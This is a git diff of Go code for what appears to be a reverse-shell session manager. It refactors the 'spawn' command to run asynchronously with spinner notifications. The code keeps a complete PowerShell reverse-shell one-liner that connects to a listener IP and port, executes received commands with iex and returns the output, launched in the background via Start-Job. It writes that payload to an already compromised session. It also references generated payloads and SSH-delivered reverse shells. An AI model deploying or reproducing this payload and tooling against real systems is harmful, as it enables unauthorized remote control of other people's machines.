@@ -2632,33 +2632,44 @@ func (m *Manager) handleRev(ip string, port int) {
 	fmt.Println(gen.GeneratePowerShell())
 }
 
-// handleSpawn spawns a new reverse shell from the currently selected session
+// handleSpawn spawns a new reverse shell from the currently selected session (CLI mode)
 func (m *Manager) handleSpawn() {
-	// Check if there's a selected session
 	if m.selectedSession == nil {
 		fmt.Println(ui.Error("No session selected. Use 'use <id>' first."))
 		return
 	}
+	m.StartSpawn()
+	// In CLI mode, just print immediately (TUI uses async callback)
+	fmt.Println(ui.Info("Spawn payload sent — waiting for connection..."))
+}
 
-	// Validate that we have IP and port
+// StartSpawn sends a spawn payload asynchronously. Uses TUI spinner + notification.
+func (m *Manager) StartSpawn() {
+	m.mu.RLock()
+	session := m.selectedSession
+	m.mu.RUnlock()
+
+	if session == nil {
+		if m.transferDoneFunc != nil {
+			m.transferDoneFunc("spawn", false, fmt.Errorf("No session selected"))
+		}
+		return
+	}
+
 	spawnIP := GlobalRuntimeConfig.GetPivotIP()
-	if spawnIP == "" {
-		fmt.Println(ui.Error("No listener IP available"))
-		return
-	}
-	if m.listenerPort == 0 {
-		fmt.Println(ui.Error("No listener port available"))
+	if spawnIP == "" || m.listenerPort == 0 {
+		if m.transferDoneFunc != nil {
+			m.transferDoneFunc("spawn", false, fmt.Errorf("No listener IP/port available"))
+		}
 		return
 	}
 
-	// Check platform
-	platform := m.selectedSession.Platform
+	platform := session.Platform
 	if platform == "detecting..." || platform == "unknown" {
-		fmt.Println(ui.Warning("Platform detection incomplete. Attempting with linux payload..."))
 		platform = "linux"
 	}
 
-	// Generate platform-specific payload
+	// Generate payload
 	var payload string
 	switch platform {
 	case "linux", "macos":
@@ -2667,57 +2678,44 @@ func (m *Manager) handleSpawn() {
 	case "windows":
 		psScript := fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
 			spawnIP, m.listenerPort)
-		// Execute in background with Start-Job
 		payload = fmt.Sprintf("powershell -c \"Start-Job -ScriptBlock {%s}\"\n", psScript)
 	default:
-		fmt.Println(ui.Error(fmt.Sprintf("Unsupported platform: %s", platform)))
-		return
-	}
-
-	// Send payload silently
-	_, err := m.selectedSession.Conn.Write([]byte(payload))
-	if err != nil {
-		fmt.Println(ui.Error(fmt.Sprintf("Failed to send spawn command: %v", err)))
-		return
-	}
-
-	// Drain command echo BEFORE starting spinner to avoid race condition
-	// The remote shell will echo the command, we need to consume it silently
-	time.Sleep(150 * time.Millisecond) // Give shell time to echo
-	drainBuffer := make([]byte, 4096)
-	m.selectedSession.Conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
-	for {
-		n, err := m.selectedSession.Conn.Read(drainBuffer)
-		if err != nil || n == 0 {
-			break
+		if m.transferDoneFunc != nil {
+			m.transferDoneFunc("spawn", false, fmt.Errorf("Unsupported platform: %s", platform))
 		}
-		// Silently discard the echo
+		return
 	}
-	m.selectedSession.Conn.SetReadDeadline(time.Time{})
 
-	// NOW start spinner after draining echo
-	spinner := ui.NewSpinner()
-	spinner.Start(fmt.Sprintf("Spawning new %s reverse shell...", platform))
+	spinID := m.startSpinner(fmt.Sprintf("Spawning %s reverse shell...", platform))
+	initialCount := m.GetSessionCount()
 
-	// Wait briefly for connection (max 5 seconds)
-	startTime := time.Now()
-	maxWait := 5 * time.Second
-	initialSessionCount := m.GetSessionCount()
-
-	for time.Since(startTime) < maxWait {
-		time.Sleep(200 * time.Millisecond)
-
-		// Check if new session arrived
-		if m.GetSessionCount() > initialSessionCount {
-			spinner.Stop()
-			// Session notification already printed by SessionOpened()
+	go func() {
+		// Send payload
+		_, err := session.Conn.Write([]byte(payload))
+		if err != nil {
+			m.stopSpinner(spinID)
+			if m.transferDoneFunc != nil {
+				m.transferDoneFunc("spawn", false, fmt.Errorf("Failed to send: %v", err))
+			}
 			return
 		}
-	}
 
-	// Timeout - but connection might still arrive later
-	spinner.Stop()
-	fmt.Println(ui.Info("Payload sent, waiting for connection..."))
+		// Wait up to 5s for new session to arrive
+		for i := 0; i < 25; i++ {
+			time.Sleep(200 * time.Millisecond)
+			if m.GetSessionCount() > initialCount {
+				m.stopSpinner(spinID)
+				// Session notification handles the rest (fire emoji etc.)
+				return
+			}
+		}
+
+		// Timeout — payload sent but no connection yet
+		m.stopSpinner(spinID)
+		if m.notifyBar != nil {
+			m.notifyBar("Spawn payload sent — waiting for connection", 0)
+		}
+	}()
 }
 
 // handleSSH connects to a remote host via SSH and executes reverse shell payload
